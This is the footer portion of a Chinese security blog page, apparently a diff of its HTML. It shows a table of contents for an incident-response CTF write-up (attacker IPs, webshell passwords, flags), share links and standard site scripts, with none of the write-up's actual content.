+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91"><span class="toc-number">2.</span> <span class="toc-text">网络拓扑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%B8%85%E5%8D%95"><span class="toc-number">3.</span> <span class="toc-text">资产清单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%A2%98%E7%9B%AE"><span class="toc-number">4.</span> <span class="toc-text">应急响应题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E8%80%85ip%E5%9C%B0%E5%9D%801%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">1.攻击者ip地址1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E8%80%85ip%E5%9C%B0%E5%9D%802%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">2.攻击者ip地址2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%BC%80%E5%A7%8B%E6%97%B6%E9%97%B4%EF%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text">3.暴力破解开始时间：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-flag1%EF%BC%9A"><span class="toc-number">4.4.</span> <span class="toc-text">4.flag1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-flag2"><span class="toc-number">4.5.</span> <span class="toc-text">5.flag2:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-flag3"><span class="toc-number">4.6.</span> <span class="toc-text">6.flag3:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%96%87%E4%BB%B6%E7%9A%84%E5%93%88%E5%B8%8C32%E4%BD%8D%E5%A4%A7%E5%86%99"><span class="toc-number">4.7.</span> <span class="toc-text">钓鱼文件的哈希32位大写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-webshell%E5%AF%86%E7%A0%811%EF%BC%9A"><span class="toc-number">4.8.</span> <span class="toc-text">7.webshell密码1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-webshell%E5%AF%86%E7%A0%812%EF%BC%9A"><span class="toc-number">4.9.</span> <span class="toc-text">8.webshell密码2：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%94%BB%E5%87%BB%E8%80%85%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3-1-2-3"><span class="toc-number">4.10.</span> <span class="toc-text">9.攻击者开放端口(1,2,3)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">4.11.</span> <span class="toc-text">10.隐藏账户的密码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%BA%AF%E6%BA%90-%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%9A"><span class="toc-number">4.12.</span> <span class="toc-text">11.[溯源]攻击者的邮箱：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%BA%AF%E6%BA%90-flag4%EF%BC%9A"><span class="toc-number">4.13.</span> <span class="toc-text">12.[溯源]flag4：</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&text=Parloo杯应急响应-畸形的爱"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&is_video=false&description=Parloo杯应急响应-畸形的爱"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Parloo杯应急响应-畸形的爱&body=Check out this article: https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&title=Parloo杯应急响应-畸形的爱"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&name=Parloo杯应急响应-畸形的爱&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2025/05/21/Parloo%E6%9D%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%95%B8%E5%BD%A2%E7%9A%84%E7%88%B1/&t=Parloo杯应急响应-畸形的爱"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    凉墨
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
